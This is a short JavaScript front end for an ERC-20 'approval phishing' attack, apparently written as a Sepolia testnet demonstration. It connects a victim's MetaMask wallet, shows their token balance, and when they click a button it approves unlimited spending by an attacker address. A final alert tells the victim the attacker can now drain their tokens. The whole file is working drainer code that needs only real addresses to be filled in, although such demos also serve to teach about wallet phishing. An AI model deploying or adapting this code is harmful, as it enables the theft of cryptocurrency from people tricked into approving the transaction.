let signer, provider;
const tokenAddress = "0xYourERC20TokenAddress";       // Replace with deployed token address on Sepolia
const attackerAddress = "0xAttackerWalletAddress";     // Replace with your attacker wallet address

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function balanceOf(address owner) view returns (uint256)"
];

async function connectWallet() {
  if (window.ethereum) {
    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();

    try {
      await window.ethereum.request({ method: "eth_requestAccounts" });
      const address = await signer.getAddress();
      document.getElementById("walletAddress").innerText = address;
      getTokenBalance(address);
    } catch (err) {
      alert("Connection failed");
    }
  } else {
    alert("MetaMask is not installed!");
  }
}

async function getTokenBalance(address) {
  const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
  const balance = await tokenContract.balanceOf(address);
  document.getElementById("balance").innerText = ethers.utils.formatUnits(balance, 18);
}

async function approveSpending() {
  const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
  const tx = await tokenContract.approve(attackerAddress, ethers.constants.MaxUint256);
  console.log("Approval TX sent:", tx.hash);
  await tx.wait();
  alert("Approval confirmed. The attacker can now drain your tokens.");
}

document.getElementById("connect").addEventListener("click", connectWallet);
document.getElementById("approve").addEventListener("click", approveSpending);
